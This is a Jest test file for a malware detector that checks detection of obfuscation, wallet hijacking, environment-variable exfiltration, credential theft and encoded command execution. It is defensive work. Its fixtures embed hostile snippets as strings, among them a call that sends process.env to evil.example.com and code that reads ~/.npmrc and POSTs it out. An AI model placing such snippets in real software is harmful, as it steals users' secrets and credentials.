/**
 * Threat Detection Tests
 * Migrated from test/unit/threat-detection.test.js to TypeScript
 */

import { describe, it, expect } from '@jest/globals';
import { detectMalware } from '../../src/lib/detection';
import { detectFileThreats } from '../../src/lib/customRuleEngine';

describe('Threat Detection', () => {
  describe('obfuscated variable names', () => {
    it('detects obfuscated hex-mangled variable names', () => {
      const maliciousContent = `
        var _0x112fa8 = ['aGVsbG8=', 'bWFsaWNpb3Vz'];
        var _0x180f = function(_0x112fa8, _0xabc) { return _0x112fa8[_0xabc]; };
      `;

      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some(
          (t) =>
            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
        )
      ).toBe(true);
    });

    it('does not flag clean, readable code', () => {
      const cleanContent = `
        function calculateTotal(items) {
          return items.reduce((sum, item) => sum + item.price, 0);
        }
      `;
      const result = detectMalware(cleanContent);
      expect(Array.isArray(result)).toBe(true);
      const highSeverity = result.filter((t) => t.severity === 'HIGH' || t.severity === 'CRITICAL');
      expect(highSeverity).toHaveLength(0);
    });
  });

  describe('wallet hijacking patterns', () => {
    it('detects ethereum wallet address replacement', () => {
      const maliciousContent = `
        function sendPayment(amount) {
          const walletAddress = '0xABC123DEF456789012345678901234567890ABCD';
          if (process.env.NODE_ENV !== 'test') {
            walletAddress = '0xdeadbeef1234567890abcdef1234567890abcdef';
          }
          transfer(walletAddress, amount);
        }
      `;
      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
    });
  });

  describe('postinstall malware patterns', () => {
    it('detects suspicious network exfiltration in postinstall', () => {
      const maliciousContent = `
        const https = require('https');
        https.get('https://evil.example.com/collect?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
      `;
      // Exfiltration is a rule-engine detection, so go through detectFileThreats
      // with default options (built-in rules on).
      const result = detectFileThreats(maliciousContent, 'postinstall.js', {}, detectMalware);
      expect(Array.isArray(result)).toBe(true);
      expect(result.some((t) => String(t.type).includes('DATA_EXFILTRATION'))).toBe(true);
    });
  });

  describe('massive hex array (known obfuscation pattern)', () => {
    it('detects a large hex-array obfuscation blob', () => {
      // Pattern: /\[(0x[0-9a-fA-F]+,\s*){3,}/g  — numeric hex literals in an array
      const hexArray = `var _a = [${Array.from({ length: 50 }, (_, i) => `0x${i.toString(16).padStart(4, '0')}`).join(', ')}];`;
      const result = detectMalware(hexArray);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some(
          (t) =>
            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
        )
      ).toBe(true);
    });
  });

  describe('false-positive guards', () => {
    it('does not flag a large but ordinary module', () => {
      const fn = (i: number) =>
        `export function helper${i}(input) {\n  const value = String(input).trim();\n  return value.length > 0 ? value : null;\n}\n`;
      const big = Array.from({ length: 200 }, (_, i) => fn(i)).join('\n');
      expect(big.length).toBeGreaterThan(5000);
      const structural = detectMalware(big).filter((t) => t.type === 'MALICIOUS_CODE_STRUCTURE');
      expect(structural).toHaveLength(0);
    });

    it('does not flag high entropy on its own', () => {
      const content =
        'const token = "aZ9!qW3#eR7$tY1%uI5^oP2&lK8*jH4(gF6)dS0_xC";\nconst other = "QmRe3Vv8bNp1Lw5Zx9Jt2Kc7Hf4Gd6Sa0";';
      const structural = detectMalware(content).filter(
        (t) => t.type === 'MALICIOUS_CODE_STRUCTURE'
      );
      expect(structural).toHaveLength(0);
    });
  });

  describe('obfuscator identifiers', () => {
    it('flags javascript-obfuscator style _0x identifiers', () => {
      const content = 'var _0x4a1b=["a","b"];function _0x2c3d(_0x5e6f){return _0x4a1b[_0x5e6f];}';
      const types = detectMalware(content).map((t) => t.type);
      expect(types).toContain('MALICIOUS_CODE_STRUCTURE');
    });
  });

  describe('capability combinations', () => {
    it('does not flag a lone require of fs or child_process', () => {
      const types = detectMalware(
        "const fs = require('fs'); fs.readFileSync('x');",
        'lib/a.js'
      ).map((t) => t.type);
      expect(types).not.toContain('SUSPICIOUS_MODULE');
      expect(types.filter((t) => t !== 'CAPABILITY_NOTE')).toHaveLength(0);
    });

    it('flags env read combined with network send as DATA_EXFILTRATION', () => {
      const code =
        "const https = require('https'); https.get('https://x.y/?e=' + JSON.stringify(process.env));";
      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'DATA_EXFILTRATION');
      expect(t?.severity).toBe('HIGH');
    });

    it('flags credential file access combined with network as CREDENTIAL_THEFT', () => {
      const code = `import { readFileSync } from 'node:fs';
        const token = readFileSync(process.env.HOME + '/.npmrc', 'utf8');
        fetch('https://x.y', { method: 'POST', body: token });`;
      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'CREDENTIAL_THEFT');
      expect(t?.severity).toBe('CRITICAL');
    });

    it('flags decode feeding execution as OBFUSCATED_EXECUTION', () => {
      const code =
        "const { exec } = require('child_process'); exec(Buffer.from('bHM=', 'base64').toString());";
      const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
      expect(types).toContain('OBFUSCATED_EXECUTION');
    });

    it('reports computed module names as DYNAMIC_MODULE_LOAD without guessing the module', () => {
      const code = "const m = require(['child_', 'process'].join('')); m.exec('id');";
      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'DYNAMIC_MODULE_LOAD');
      expect(t).toBeDefined();
      expect(t?.details).not.toContain('child_process');
    });

    it('recognises import(), node: prefixes and third-party network clients', () => {
      const code = `import axios from 'axios';
        const { userInfo } = await import('node:os');
        axios.post('https://x.y', userInfo());`;
      const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
      expect(types).toContain('DATA_EXFILTRATION');
    });

    it('demotes combinations in test files to LOW', () => {
      const code = "const https = require('https'); https.get('u?' + process.env.TOKEN);";
      const t = detectMalware(code, 'test/a.test.js').find((x) => x.type === 'DATA_EXFILTRATION');
      expect(t?.severity).toBe('LOW');
    });

    it('is silent on unparseable input', () => {
      const types = detectMalware('this is not javascript {{{', 'lib/a.js').map((t) => t.type);
      expect(
        types.some((t) => ['DATA_EXFILTRATION', 'CREDENTIAL_THEFT', 'CAPABILITY_NOTE'].includes(t))
      ).toBe(false);
    });
  });
});
